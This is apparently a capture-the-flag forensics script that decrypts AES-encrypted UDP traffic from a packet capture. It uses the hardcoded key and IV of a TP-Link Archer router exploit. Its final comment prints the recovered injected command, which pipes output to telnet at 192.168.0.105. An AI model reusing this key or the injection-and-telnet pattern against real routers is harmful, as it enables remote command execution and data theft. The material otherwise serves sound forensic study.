import json
import binascii
from Crypto.Cipher import AES
import Crypto.Cipher.AES

# Open Exported JSON data that was exported from the PCAP with this filter:
# ip.src == 192.168.0.105 && udp && udp.length > 175
# Then in Wireshark: File > Export Packet Dissections > As JSON
jf = open("./ac_json.json", "r").read()

jdata = json.loads(jf)

# AES decryption information defined in the exploit code
# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/misc/tplink_archer_a7_c7_lan_rce.rb
aes_iv = b'1234567890abcdef'
aes_key = b'TPONEMESH_Kf!xn?'

# Define out cipher object
decipher = AES.new(aes_key,AES.MODE_CBC,aes_iv)

# 16 byte chunks, please
def split_hex_string(hex_string):
    n = 32
    return [hex_string[i:i+n] for i in range(0, len(hex_string), n)]

# Iterate over all data and instantiate our global string
decoded_str = ''
for entry in jdata:
    raw_hex_data = entry['_source']["layers"]["data"]["data.data"].replace(":","")

    raw_hex_chunks = split_hex_string(raw_hex_data)
    raw_bin_chunks = [binascii.unhexlify(x) for x in raw_hex_chunks]

    decrypted_bin_chunks = [decipher.decrypt(x) for x in raw_bin_chunks]

    # The 8th chunk of each chunks_list is the tail end of a printf statement.
    # The 5th character of that chunk is the character printf is writing.
    decoded_str += decrypted_bin_chunks[7].decode("utf-8")[4]

print(decoded_str)

#"(ls -l&&echo hitcon{Why_can_one_place_be_injected_twice}>flag&&ls -l)|telnet 192.168.0.105 4321 
